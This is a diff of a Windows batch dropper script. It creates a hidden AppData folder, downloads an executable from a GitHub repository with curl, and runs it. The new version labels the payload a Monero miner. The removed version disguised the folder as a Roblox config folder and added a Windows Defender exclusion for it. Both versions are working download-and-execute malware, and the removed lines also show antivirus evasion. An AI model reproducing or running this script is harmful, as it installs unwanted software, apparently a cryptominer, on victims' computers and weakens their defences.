@@ -1,40 +1,34 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
+:: Set the download location
+set "folderPath=%USERPROFILE%\AppData\Local\MoneroMiner"
 mkdir "%folderPath%"
 
 :: Debugging: Check folder creation status
 if exist "%folderPath%" (
-    echo Folder created successfully: %folderPath%
+    echo Folder created successfully: "%folderPath%"
 ) else (
-    echo Failed to create folder: %folderPath%
+    echo Failed to create folder: "%folderPath%"
     exit /b 1
 )
 
-:: Debugging: Attempt to add exclusion to Windows Defender
-echo Adding exclusion to Windows Defender...
-powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
-if %errorlevel% neq 0 (
-    echo Failed to add exclusion.
-    exit /b 1
-)
+:: Debugging: Attempt to download the Monero miner executable
+echo Downloading miner executable...
+curl -L -o "%folderPath%\LulzalotWasHere.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/LulzalotWasHere.exe" 2> "%folderPath%\download_error.log"
 
-:: Debugging: Attempt to download the file
-echo Downloading file...
-curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe"
-
-:: Debugging: Check if curl succeeded
+:: Check if curl failed
 if %errorlevel% neq 0 (
     echo Curl failed with error code %errorlevel%.
+    echo Check the error log for details: "%folderPath%\download_error.log"
     exit /b 1
 ) else (
     echo File downloaded successfully.
 )
 
 :: Debugging: Verify the file exists and check its size
-if exist "%folderPath%\Lulzalot Was Here.exe" (
-    for %%F in ("%folderPath%\Lulzalot Was Here.exe") do (
+if exist "%folderPath%\LulzalotWasHere.exe" (
+    for %%F in ("%folderPath%\LulzalotWasHere.exe") do (
         set filesize=%%~zF
     )
     
@@ -49,7 +43,9 @@ if exist "%folderPath%\Lulzalot Was Here.exe" (
     exit /b 1
 )
 
-:: Run the executable if everything is okay
-echo Running the executable...
-start "" "%folderPath%\Lulzalot Was Here.exe"
+:: Debugging: Confirm that the miner can be run
+echo Running the Monero miner...
+start "" "%folderPath%\LulzalotWasHere.exe"
+
+:: End of script
 exit
